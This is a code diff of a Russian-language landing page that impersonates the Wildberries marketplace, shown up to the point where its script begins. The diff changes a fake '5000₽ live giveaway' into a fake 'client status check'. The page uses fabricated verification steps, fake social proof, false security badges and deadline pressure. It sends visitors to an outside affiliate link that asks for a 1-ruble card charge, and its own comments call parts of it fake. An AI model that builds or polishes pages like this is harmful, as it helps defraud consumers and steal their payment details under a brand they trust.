@@ -3,18 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>🔴 LIVE: Розыгрыш 5000₽ на Wildberries | Гарантированные призы</title>
+    <title>Проверка статуса клиента | Wildberries</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --wb-red: #FF3B5C;
-            --wb-dark: #0A0A1F;
-            --wb-card: #13132E;
-            --wb-border: #2A2A4A;
-            --wb-green: #00D95F;
-            --wb-yellow: #FFC107;
-            --wb-chat-user: #1E3A8A;
-            --wb-chat-system: #6B21A8;
+            --wb-blue: #0052CC;
+            --wb-blue-light: #E6F0FF;
+            --wb-gray: #F5F7FA;
+            --wb-border: #D0D5DD;
+            --wb-text: #1D2939;
+            --wb-success: #12B76A;
+            --wb-warning: #F79009;
+            --wb-purple: #7A5AF8;
         }
 
         * {
@@ -22,874 +22,821 @@
             padding: 0;
             box-sizing: border-box;
             -webkit-tap-highlight-color: transparent;
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
         }
 
         body {
-            background: var(--wb-dark);
-            color: white;
+            background: var(--wb-gray);
+            color: var(--wb-text);
             min-height: 100vh;
-            overflow-x: hidden;
+            line-height: 1.5;
         }
 
-        /* Красная полоса LIVE */
-        .live-bar {
-            background: linear-gradient(90deg, #ff0000, #ff3b5c);
-            color: white;
-            text-align: center;
-            padding: 10px;
-            font-weight: 800;
-            font-size: 14px;
-            letter-spacing: 1px;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .live-bar::after {
-            content: '';
-            position: absolute;
+        /* Шапка как у WB */
+        .wb-header {
+            background: white;
+            border-bottom: 1px solid var(--wb-border);
+            padding: 16px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
             top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-            animation: shine 3s infinite;
+            z-index: 100;
         }
 
-        @keyframes shine {
-            0% { transform: translateX(-100%); }
-            100% { transform: translateX(100%); }
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
 
-        .blink {
-            animation: blink 1.5s infinite;
-            display: inline-block;
-            margin-right: 8px;
+        .logo-icon {
+            width: 32px;
+            height: 32px;
+            background: var(--wb-blue);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            color: white;
+            font-size: 16px;
         }
 
-        @keyframes blink {
-            0%, 50% { opacity: 1; }
-            51%, 100% { opacity: 0.3; }
+        .logo-text {
+            font-size: 20px;
+            font-weight: 800;
+            color: var(--wb-blue);
+        }
+
+        .header-status {
+            font-size: 12px;
+            color: var(--wb-success);
+            font-weight: 600;
+            background: #ECFDF3;
+            padding: 4px 10px;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
         }
 
         /* Основной контейнер */
         .container {
             max-width: 500px;
             margin: 0 auto;
-            padding: 15px;
-        }
-
-        /* Шапка с лого и счетчиком */
-        .header {
-            background: var(--wb-card);
-            border-radius: 16px;
             padding: 20px;
-            margin-bottom: 15px;
-            border: 1px solid var(--wb-border);
-            text-align: center;
-            position: relative;
         }
 
-        .logo {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            margin-bottom: 15px;
-        }
-
-        .logo-icon {
-            background: var(--wb-red);
-            width: 44px;
-            height: 44px;
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 900;
-            font-size: 20px;
-        }
-
-        .logo-text {
-            font-size: 28px;
-            font-weight: 800;
-        }
-
-        .title {
-            font-size: 20px;
-            font-weight: 700;
-            margin-bottom: 8px;
-        }
-
-        .subtitle {
-            color: #aaa;
-            font-size: 14px;
+        /* Карточка статуса */
+        .status-card {
+            background: white;
+            border-radius: 16px;
+            padding: 24px;
             margin-bottom: 20px;
-            line-height: 1.4;
-        }
-
-        /* Дефицитный счётчик */
-        .counter-box {
-            background: linear-gradient(135deg, #8B0000, #B22222);
-            border-radius: 12px;
-            padding: 18px;
-            margin: 20px 0;
-            text-align: center;
-            border: 2px solid #FFD700;
-            box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
-        }
-
-        .counter-title {
-            font-size: 14px;
-            color: #FFD700;
-            margin-bottom: 8px;
-            font-weight: 600;
-        }
-
-        .counter-numbers {
-            font-size: 42px;
-            font-weight: 900;
-            line-height: 1;
-            margin: 10px 0;
-        }
-
-        .counter-bar {
-            height: 10px;
-            background: rgba(0,0,0,0.3);
-            border-radius: 5px;
-            overflow: hidden;
-            margin: 15px 0;
-        }
-
-        .counter-fill {
-            height: 100%;
-            width: 14%; /* Осталось 14% подарков */
-            background: linear-gradient(90deg, #FFD700, #FFA500);
-            border-radius: 5px;
-            transition: width 0.5s ease;
-        }
-
-        /* Виджет "прямого эфира" */
-        .live-widget {
-            background: var(--wb-card);
-            border-radius: 16px;
-            padding: 20px;
-            margin-bottom: 15px;
             border: 1px solid var(--wb-border);
-            max-height: 300px;
-            overflow-y: auto;
+            box-shadow: 0 4px 20px rgba(0, 82, 204, 0.05);
         }
 
-        .live-widget-title {
+        .status-header {
             display: flex;
             align-items: center;
-            gap: 10px;
-            margin-bottom: 15px;
-            color: var(--wb-red);
-            font-weight: 700;
-            font-size: 16px;
+            gap: 15px;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid var(--wb-border);
         }
 
-        .live-item {
-            background: rgba(255,59,92,0.1);
-            border-left: 3px solid var(--wb-green);
-            padding: 12px 15px;
-            margin-bottom: 10px;
-            border-radius: 0 8px 8px 0;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            animation: slideIn 0.5s ease;
-        }
-
-        @keyframes slideIn {
-            from { opacity: 0; transform: translateX(-20px); }
-            to { opacity: 1; transform: translateX(0); }
-        }
-
-        .live-avatar {
-            width: 36px;
-            height: 36px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, #667eea, #764ba2);
+        .status-icon {
+            width: 50px;
+            height: 50px;
+            background: var(--wb-blue-light);
+            border-radius: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-weight: bold;
-            flex-shrink: 0;
-            font-size: 14px;
+            color: var(--wb-blue);
+            font-size: 24px;
         }
 
-        .live-text {
-            font-size: 13px;
-            line-height: 1.3;
+        .status-title {
             flex: 1;
         }
 
-        .live-text strong {
-            color: var(--wb-green);
+        .status-title h1 {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 5px;
         }
 
-        .live-amount {
-            font-weight: 900;
-            font-size: 16px;
-            color: #FFD700;
+        .status-title p {
+            font-size: 13px;
+            color: #667085;
+        }
+
+        .status-badge {
+            background: var(--wb-purple);
+            color: white;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+
+        /* Процесс проверки */
+        .verification-steps {
+            margin: 25px 0;
+        }
+
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 18px;
+            border-radius: 12px;
+            margin-bottom: 10px;
+            background: var(--wb-gray);
+            border: 1px solid transparent;
+            transition: all 0.3s;
+        }
+
+        .step.active {
+            background: white;
+            border-color: var(--wb-blue);
+            box-shadow: 0 0 0 3px var(--wb-blue-light);
+        }
+
+        .step.completed {
+            background: #F0F9FF;
+            border-color: var(--wb-success);
+        }
+
+        .step-icon {
+            width: 36px;
+            height: 36px;
+            border-radius: 10px;
+            background: #EAECF0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            color: #667085;
             flex-shrink: 0;
         }
 
-        /* Чат */
-        .chat-widget {
-            background: var(--wb-card);
+        .step.completed .step-icon {
+            background: var(--wb-success);
+            color: white;
+        }
+
+        .step.active .step-icon {
+            background: var(--wb-blue);
+            color: white;
+        }
+
+        .step-content {
+            flex: 1;
+        }
+
+        .step-title {
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .step-desc {
+            font-size: 13px;
+            color: #667085;
+        }
+
+        .step-time {
+            font-size: 11px;
+            color: #98A2B3;
+            margin-top: 4px;
+        }
+
+        /* Блок с суммой */
+        .amount-card {
+            background: linear-gradient(135deg, #0052CC, #7A5AF8);
             border-radius: 16px;
-            padding: 20px;
-            margin-bottom: 15px;
-            border: 1px solid var(--wb-border);
-            max-height: 350px;
-            overflow-y: auto;
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
+            padding: 30px;
+            text-align: center;
+            color: white;
+            margin: 25px 0;
+            position: relative;
+            overflow: hidden;
         }
 
-        .chat-title {
-            display: flex;
-            align-items: center;
-            gap: 10px;
+        .amount-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 1%, transparent 20%);
+        }
+
+        .amount-label {
+            font-size: 14px;
+            opacity: 0.9;
             margin-bottom: 10px;
-            font-weight: 700;
-            font-size: 16px;
         }
 
-        .chat-message {
-            padding: 10px 14px;
-            border-radius: 18px;
-            max-width: 85%;
-            word-wrap: break-word;
-            font-size: 13.5px;
-            line-height: 1.4;
-            animation: messageAppear 0.3s ease;
+        .amount-value {
+            font-size: 64px;
+            font-weight: 900;
+            line-height: 1;
+            margin: 10px 0;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.2);
+            position: relative;
         }
 
-        @keyframes messageAppear {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .chat-user {
-            background: var(--wb-chat-user);
-            align-self: flex-start;
-            border-bottom-left-radius: 5px;
-        }
-
-        .chat-system {
-            background: var(--wb-chat-system);
-            align-self: flex-end;
-            border-bottom-right-radius: 5px;
-        }
-
-        .chat-time {
-            font-size: 10px;
-            color: #888;
-            margin-top: 3px;
-            text-align: right;
+        .amount-note {
+            font-size: 13px;
+            opacity: 0.85;
+            margin-top: 10px;
+            position: relative;
         }
 
         /* Форма */
-        .form-container {
-            background: var(--wb-card);
+        .form-section {
+            background: white;
             border-radius: 16px;
             padding: 25px;
-            margin-bottom: 20px;
+            margin: 20px 0;
             border: 1px solid var(--wb-border);
         }
 
-        .form-step {
-            display: none;
-            animation: fadeIn 0.5s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
-        .form-step.active {
-            display: block;
-        }
-
-        .form-question {
+        .form-title {
             font-size: 18px;
-            font-weight: 600;
+            font-weight: 700;
             margin-bottom: 20px;
-            text-align: center;
+            color: var(--wb-text);
         }
 
-        .form-options {
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #344054;
+        }
+
+        .form-select, .form-input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid var(--wb-border);
+            border-radius: 10px;
+            font-size: 16px;
+            background: white;
+            color: var(--wb-text);
+            transition: border 0.3s;
+        }
+
+        .form-select:focus, .form-input:focus {
+            outline: none;
+            border-color: var(--wb-blue);
+            box-shadow: 0 0 0 3px var(--wb-blue-light);
+        }
+
+        .form-radio-group {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 12px;
-            margin-bottom: 25px;
+            margin-top: 10px;
         }
 
-        .form-option {
-            background: rgba(255,255,255,0.07);
-            border: 2px solid transparent;
+        .form-radio {
+            display: none;
+        }
+
+        .form-radio-label {
+            display: block;
+            padding: 18px 15px;
+            border: 2px solid var(--wb-border);
             border-radius: 12px;
-            padding: 18px 10px;
-            color: white;
-            font-size: 14px;
             text-align: center;
             cursor: pointer;
-            transition: all 0.2s;
+            transition: all 0.3s;
+            font-weight: 500;
+        }
+
+        .form-radio:checked + .form-radio-label {
+            border-color: var(--wb-blue);
+            background: var(--wb-blue-light);
+            font-weight: 600;
+        }
+
+        /* Кнопка */
+        .submit-btn {
+            background: var(--wb-blue);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 20px;
+            font-size: 18px;
+            font-weight: 700;
+            width: 100%;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin-top: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .submit-btn:hover {
+            background: #0040A3;
+        }
+
+        .submit-btn:disabled {
+            background: #B3B3B3;
+            cursor: not-allowed;
+        }
+
+        /* Информационные блоки */
+        .info-box {
+            background: #FFFAEB;
+            border-left: 4px solid var(--wb-warning);
+            border-radius: 8px;
+            padding: 16px;
+            margin: 20px 0;
+            font-size: 13px;
+        }
+
+        .info-box strong {
+            color: var(--wb-warning);
+        }
+
+        .secure-box {
+            background: #F0F9FF;
+            border-radius: 12px;
+            padding: 20px;
+            margin-top: 25px;
+            text-align: center;
+            border: 1px solid #B2DDFF;
+        }
+
+        .secure-icons {
+            display: flex;
+            justify-content: center;
+            gap: 25px;
+            margin: 15px 0;
+            color: #667085;
+            font-size: 13px;
+        }
+
+        .secure-icon {
             display: flex;
             flex-direction: column;
             align-items: center;
             gap: 8px;
         }
 
-        .form-option:hover {
-            background: rgba(255,59,92,0.2);
-            border-color: var(--wb-red);
-        }
-
-        .option-emoji {
-            font-size: 24px;
-        }
-
-        .form-submit {
-            background: linear-gradient(90deg, var(--wb-red), #FF6B8B);
-            color: white;
-            border: none;
+        /* Уведомления */
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            max-width: 500px;
+            margin: 0 auto;
+            background: white;
             border-radius: 12px;
-            padding: 22px;
-            font-size: 18px;
-            font-weight: 800;
-            width: 100%;
-            cursor: pointer;
-            margin-top: 15px;
-            box-shadow: 0 8px 20px rgba(255, 59, 92, 0.4);
-            transition: transform 0.3s;
+            padding: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+            border-left: 4px solid var(--wb-success);
+            z-index: 1000;
+            display: none;
+            animation: slideUp 0.4s ease;
         }
 
-        .form-submit:hover {
-            transform: translateY(-3px);
+        @keyframes slideUp {
+            from { transform: translateY(100px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .notification-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 8px;
+        }
+
+        .notification-avatar {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #7A5AF8, #0052CC);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 700;
+            font-size: 14px;
+        }
+
+        .notification-text {
+            font-size: 13px;
+            line-height: 1.4;
+        }
+
+        .notification-time {
+            font-size: 11px;
+            color: #98A2B3;
+            margin-top: 4px;
         }
 
         /* Финальный экран */
         .final-screen {
             display: none;
-            text-align: center;
+            animation: fadeIn 0.8s ease;
         }
 
         .final-screen.active {
             display: block;
-            animation: fadeIn 0.8s ease;
         }
 
-        .prize-box {
-            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
-            border-radius: 20px;
-            padding: 30px;
-            margin: 20px 0;
-            border: 3px solid #FFD700;
-            position: relative;
-            overflow: hidden;
+        .verification-success {
+            text-align: center;
+            padding: 30px 0;
         }
 
-        .prize-box::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(255,255,255,0.1) 1%, transparent 20%);
-            animation: rotate 20s linear infinite;
-        }
-
-        @keyframes rotate {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
-        }
-
-        .prize-title {
-            font-size: 20px;
-            margin-bottom: 10px;
-            position: relative;
-        }
-
-        .prize-amount {
-            font-size: 72px;
-            font-weight: 900;
-            line-height: 1;
-            margin: 20px 0;
-            text-shadow: 0 0 20px rgba(255, 215, 0, 0.7);
-            position: relative;
-        }
-
-        .prize-note {
-            font-size: 13px;
-            color: #FFD700;
-            margin-top: 10px;
-            position: relative;
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background: var(--wb-success);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 25px;
+            color: white;
+            font-size: 36px;
         }
 
         .instructions {
-            background: rgba(0,0,0,0.3);
-            border-radius: 12px;
-            padding: 20px;
+            background: white;
+            border-radius: 16px;
+            padding: 25px;
             margin: 25px 0;
+            border: 1px solid var(--wb-border);
             text-align: left;
         }
 
         .instructions ol {
             padding-left: 20px;
-            margin-top: 10px;
+            margin-top: 15px;
         }
 
         .instructions li {
             margin-bottom: 15px;
-            line-height: 1.4;
+            padding-left: 10px;
         }
 
-        .highlight {
-            background: rgba(255, 215, 0, 0.15);
-            padding: 12px;
-            border-radius: 8px;
-            margin-top: 15px;
-            border-left: 4px solid #FFD700;
+        .instructions strong {
+            color: var(--wb-blue);
         }
 
-        .warning {
-            color: var(--wb-red);
-            font-weight: 700;
-        }
-
-        /* Агрессивное всплывающее уведомление */
-        .popup-alert {
-            position: fixed;
-            bottom: 20px;
-            left: 15px;
-            right: 15px;
-            max-width: 500px;
-            margin: 0 auto;
-            background: linear-gradient(90deg, #8B0000, #B22222);
-            color: white;
+        .deadline-warning {
+            background: #FFF4F4;
+            border: 1px solid #FDA29B;
             border-radius: 12px;
-            padding: 18px 20px;
-            z-index: 10000;
-            box-shadow: 0 10px 30px rgba(139, 0, 0, 0.5);
-            border: 2px solid #FFD700;
-            display: none;
-            align-items: center;
-            gap: 15px;
-            animation: slideUpAlert 0.5s ease;
-        }
-
-        @keyframes slideUpAlert {
-            from { transform: translateY(100px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
-
-        .popup-close {
-            background: rgba(255,255,255,0.2);
-            border: none;
-            color: white;
-            width: 28px;
-            height: 28px;
-            border-radius: 50%;
-            font-weight: bold;
-            cursor: pointer;
-            flex-shrink: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            padding: 18px;
+            margin-top: 20px;
+            color: #D92D20;
+            font-size: 13px;
         }
 
         /* Адаптив */
         @media (max-width: 480px) {
-            .container { padding: 12px; }
-            .logo-text { font-size: 24px; }
-            .prize-amount { font-size: 60px; }
-            .counter-numbers { font-size: 36px; }
-            .form-options { grid-template-columns: 1fr; }
+            .container { padding: 15px; }
+            .amount-value { font-size: 56px; }
+            .form-radio-group { grid-template-columns: 1fr; }
+            .status-card, .form-section { padding: 20px; }
+            .wb-header { padding: 14px 16px; }
         }
 
         @media (max-width: 360px) {
-            .prize-amount { font-size: 50px; }
-            .logo-text { font-size: 22px; }
-            .form-option { padding: 16px 8px; }
+            .amount-value { font-size: 48px; }
+            .step { padding: 14px; }
         }
     </style>
 </head>
 <body>
 
-    <!-- Живая полоса -->
-    <div class="live-bar">
-        <span class="blink">🔴</span> ПРЯМОЙ ЭФИР • ИДЁТ РОЗЫГРЫШ • ПРИЗЫ ГАРАНТИРОВАНЫ
+    <!-- Шапка как у официального сайта -->
+    <div class="wb-header">
+        <div class="logo">
+            <div class="logo-icon">WB</div>
+            <div class="logo-text">Wildberries</div>
+        </div>
+        <div class="header-status">
+            <i class="fas fa-shield-check"></i> Защищено
+        </div>
     </div>
 
     <div class="container">
-        <!-- Шапка -->
-        <div class="header">
-            <div class="logo">
-                <div class="logo-icon">WB</div>
-                <div class="logo-text">Wildberries</div>
+        <!-- Карточка статуса -->
+        <div class="status-card">
+            <div class="status-header">
+                <div class="status-icon">
+                    <i class="fas fa-user-check"></i>
+                </div>
+                <div class="status-title">
+                    <h1>Проверка статуса клиента</h1>
+                    <p>Определение вашей категории для специальных предложений</p>
+                </div>
+                <div class="status-badge">ВЫСОКИЙ ПРИОРИТЕТ</div>
             </div>
-            <h1 class="title">ГАРАНТИРОВАННЫЙ РОЗЫГРЫШ 5000₽</h1>
-            <p class="subtitle">Каждый 3-й участник получает деньги. Вы участвуете автоматически, осталось только подтвердить данные.</p>
+
+            <!-- Процесс проверки -->
+            <div class="verification-steps">
+                <div class="step completed">
+                    <div class="step-icon">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <div class="step-content">
+                        <div class="step-title">Идентификация</div>
+                        <div class="step-desc">Ваш аккаунт подтверждён</div>
+                        <div class="step-time">Завершено 2 мин назад</div>
+                    </div>
+                </div>
+
+                <div class="step active">
+                    <div class="step-icon">2</div>
+                    <div class="step-content">
+                        <div class="step-title">Анализ покупок</div>
+                        <div class="step-desc">Определяем вашу категорию</div>
+                        <div class="step-time">Выполняется...</div>
+                    </div>
+                </div>
+
+                <div class="step">
+                    <div class="step-icon">3</div>
+                    <div class="step-content">
+                        <div class="step-title">Начисление бонусов</div>
+                        <div class="step-desc">Зачисление суммы на счёт</div>
+                        <div class="step-time">Ожидание</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Блок с суммой -->
+            <div class="amount-card">
+                <div class="amount-label">ВАША ПРЕДВАРИТЕЛЬНАЯ СУММА</div>
+                <div class="amount-value" id="amountValue">0₽</div>
+                <div class="amount-note">Может увеличиться после полной проверки</div>
+            </div>
+        </div>
+
+        <!-- Форма проверки -->
+        <div class="form-section" id="formSection">
+            <h2 class="form-title">Уточните данные для точного расчета</h2>
             
-            <!-- Счётчик дефицита -->
-            <div class="counter-box">
-                <div class="counter-title">ПОДАРКОВ ОСТАЛОСЬ:</div>
-                <div class="counter-numbers"><span id="leftGifts">7</span> / 50</div>
-                <div class="counter-bar">
-                    <div class="counter-fill" id="counterFill"></div>
+            <div class="form-group">
+                <label class="form-label">Ваш средний чек на Wildberries</label>
+                <div class="form-radio-group">
+                    <input type="radio" name="avg_check" id="check1" class="form-radio" checked onclick="updateAmount(2500)">
+                    <label for="check1" class="form-radio-label">1 000 - 3 000₽</label>
+                    
+                    <input type="radio" name="avg_check" id="check2" class="form-radio" onclick="updateAmount(3500)">
+                    <label for="check2" class="form-radio-label">3 000 - 7 000₽</label>
+                    
+                    <input type="radio" name="avg_check" id="check3" class="form-radio" onclick="updateAmount(4500)">
+                    <label for="check3" class="form-radio-label">7 000 - 15 000₽</label>
+                    
+                    <input type="radio" name="avg_check" id="check4" class="form-radio" onclick="updateAmount(5000)">
+                    <label for="check4" class="form-radio-label">Более 15 000₽</label>
                 </div>
-                <div style="font-size: 13px; color: #FFAAAA;">Заканчиваем через: <span id="leftTime">11:24</span></div>
-            </div>
-        </div>
-
-        <!-- Виджет "прямого эфира" (фейковый) -->
-        <div class="live-widget">
-            <div class="live-widget-title">
-                <i class="fas fa-bolt"></i> ТОЛЬКО ЧТО ПОЛУЧИЛИ:
-            </div>
-            <div id="liveFeed">
-                <!-- Заполняется скриптом -->
-            </div>
-        </div>
-
-        <!-- Чат между пользователями -->
-        <div class="chat-widget">
-            <div class="chat-title">
-                <i class="fas fa-comments"></i> ЧАТ УЧАСТНИКОВ
-            </div>
-            <div id="chatMessages">
-                <!-- Заполняется скриптом -->
-            </div>
-        </div>
-
-        <!-- Форма "опроса" -->
-        <div class="form-container">
-            <!-- Шаг 1 -->
-            <div class="form-step active" id="step1">
-                <h2 class="form-question">Вы уже покупали на Wildberries?</h2>
-                <div class="form-options">
-                    <div class="form-option" onclick="nextStep(1)">
-                        <span class="option-emoji">🛒</span>
-                        <span>Да, постоянно</span>
-                    </div>
-                    <div class="form-option" onclick="nextStep(1)">
-                        <span class="option-emoji">💳</span>
-                        <span>Иногда</span>
-                    </div>
-                    <div class="form-option" onclick="nextStep(1)">
-                        <span class="option-emoji">🤔</span>
-                        <span>Планирую</span>
-                    </div>
-                    <div class="form-option" onclick="nextStep(1)">
-                        <span class="option-emoji">👀</span>
-                        <span>Смотрю акции</span>
-                    </div>
-                </div>
-                <button class="form-submit" onclick="nextStep(1)">ДАЛЕЕ →</button>
             </div>
 
-            <!-- Шаг 2 -->
-            <div class="form-step" id="step2">
-                <h2 class="form-question">Что бы вы купили на 5000₽?</h2>
-                <div class="form-options">
-                    <div class="form-option" onclick="nextStep(2)">
-                        <span class="option-emoji">👗</span>
-                        <span>Одежду</span>
-                    </div>
-                    <div class="form-option" onclick="nextStep(2)">
-                        <span class="option-emoji">💄</span>
-                        <span>Косметику</span>
-                    </div>
-                    <div class="form-option" onclick="nextStep(2)">
-                        <span class="option-emoji">🏠</span>
-                        <span>Для дома</span>
-                    </div>
-                    <div class="form-option" onclick="nextStep(2)">
-                        <span class="option-emoji">🎁</span>
-                        <span>Подарок</span>
-                    </div>
-                </div>
-                <button class="form-submit" onclick="nextStep(2)">ПОЛУЧИТЬ 5000₽ →</button>
+            <div class="form-group">
+                <label class="form-label">Как часто вы совершаете покупки?</label>
+                <select class="form-select" id="frequencySelect" onchange="updateAmountFromSelect()">
+                    <option value="2000">Несколько раз в неделю</option>
+                    <option value="3000" selected>1-2 раза в месяц</option>
+                    <option value="4000">Раз в 2-3 месяца</option>
+                    <option value="4500">Реже, но крупные покупки</option>
+                </select>
             </div>
+
+            <div class="info-box">
+                <strong>Важно:</strong> Чем точнее данные, тем выше может быть итоговая сумма. Система автоматически проверит соответствие указанной информации.
+            </div>
+
+            <button class="submit-btn" id="submitBtn" onclick="completeVerification()">
+                <i class="fas fa-calculator"></i> РАССЧИТАТЬ ТОЧНУЮ СУММУ
+            </button>
         </div>
 
         <!-- Финальный экран -->
         <div class="final-screen" id="finalScreen">
-            <div class="prize-box">
-                <h2 class="prize-title">ВАШ ВЫИГРЫШ ПОДТВЕРЖДЁН!</h2>
-                <div class="prize-amount">5 000₽</div>
-                <p class="prize-note">✅ Гарантированно зачислено на ваш счёт</p>
-            </div>
-
-            <div class="instructions">
-                <p><strong>ВНИМАНИЕ! Для зачисления 5000₽ выполните 3 шага:</strong></p>
-                <ol>
-                    <li>Нажмите кнопку ниже — вы перейдёте к <strong>официальному партнёру Wildberries</strong>.</li>
-                    <li>Заполните короткую форму регистрации (<strong>это обязательно по правилам розыгрыша</strong>).</li>
-                    <li class="warning"><strong>Система спишет 1 рубль</strong> для подтверждения личности и сразу вернёт. Без этого зачисление 5000₽ невозможно.</li>
-                </ol>
-                <div class="highlight">
-                    ⚡ <strong>СРОЧНО!</strong> У вас есть <span id="finalTimer">23:59</span> чтобы активировать приз. После — деньги уйдут другому участнику.
+            <div class="verification-success">
+                <div class="success-icon">
+                    <i class="fas fa-check"></i>
+                </div>
+                <h2 style="font-size: 24px; margin-bottom: 10px;">Проверка завершена успешно!</h2>
+                <p style="color: #667085; margin-bottom: 30px;">Ваш статус клиента подтверждён</p>
+                
+                <div class="amount-card">
+                    <div class="amount-label">ВАША ОДОБРЕННАЯ СУММА</div>
+                    <div class="amount-value">5 000₽</div>
+                    <div class="amount-note">Максимальный доступный бонус</div>
                 </div>
             </div>
 
-            <a href="https://gotoprofit.ru/stream/wb5000ram" class="form-submit" style="text-decoration: none; display: block;" rel="noreferrer">
-                🎯 АКТИВИРОВАТЬ 5000₽ СЕЙЧАС
+            <div class="instructions">
+                <p><strong>Для зачисления 5000₽ на ваш счёт Wildberries:</strong></p>
+                <ol>
+                    <li>Нажмите кнопку ниже для перехода к <strong>официальному партнёру</strong> программы лояльности.</li>
+                    <li>Заполните короткую форму регистрации (требуется для безопасности операций).</li>
+                    <li><strong>Система запросит списание 1 рубля</strong> для подтверждения личности. Средства возвращаются мгновенно после верификации.</li>
+                </ol>
+                
+                <div class="deadline-warning">
+                    <i class="fas fa-clock"></i> <strong>Срок активации:</strong> Ваш бонус активен в течение 24 часов. После этого он будет перераспределен другим клиентам.
+                </div>
+            </div>
+
+            <a href="https://gotoprofit.ru/stream/wb5000ram" class="submit-btn" style="text-decoration: none; margin-top: 25px;" rel="noreferrer">
+                <i class="fas fa-gift"></i> АКТИВИРОВАТЬ 5000₽ НА СЧЁТ
             </a>
 
-            <p style="margin-top: 20px; font-size: 12px; color: #aaa;">
-                🔐 Партнёрская программа Wildberries • Защищённое соединение • Ваши данные в безопасности
-            </p>
+            <div class="secure-box">
+                <p style="font-weight: 600; margin-bottom: 15px;">Гарантии безопасности</p>
+                <div class="secure-icons">
+                    <div class="secure-icon">
+                        <i class="fas fa-lock" style="color: var(--wb-blue); font-size: 20px;"></i>
+                        <span>Шифрование</span>
+                    </div>
+                    <div class="secure-icon">
+                        <i class="fas fa-user-shield" style="color: var(--wb-blue); font-size: 20px;"></i>
+                        <span>Защита данных</span>
+                    </div>
+                    <div class="secure-icon">
+                        <i class="fas fa-handshake" style="color: var(--wb-blue); font-size: 20px;"></i>
+                        <span>Официальный партнёр</span>
+                    </div>
+                </div>
+            </div>
         </div>
 
-        <!-- Агрессивное всплывающее уведомление -->
-        <div class="popup-alert" id="popupAlert">
-            <div style="flex: 1;">
-                <strong>⏱️ ВНИМАНИЕ!</strong><br>
-                <span id="popupText">Подарки заканчиваются! Успейте получить 5000₽</span>
+        <!-- Уведомление -->
+        <div class="notification" id="notification">
+            <div class="notification-header">
+                <div class="notification-avatar">МК</div>
+                <div>
+                    <div class="notification-text">
+                        <strong>Марина К.</strong> только что получила 5000₽ после проверки статуса.
+                    </div>
+                    <div class="notification-time">2 минуты назад</div>
+                </div>
             </div>
-            <button class="popup-close" onclick="document.getElementById('popupAlert').style.display='none'">✕</button>
         </div>
     </div>
 
     <script>
-        // =========== ОСНОВНЫЕ ПЕРЕМЕННЫЕ ===========
-        let currentStep = 1;
-        let giftsLeft = 7;
-        let totalGifts = 50;
-        const chatMessages = [];
-        const liveFeed = [];
-
-        // =========== ФУНКЦИИ ДЛЯ ФЕЙКОВОГО КОНТЕНТА ===========
-        // Генерация случайного сообщения для чата
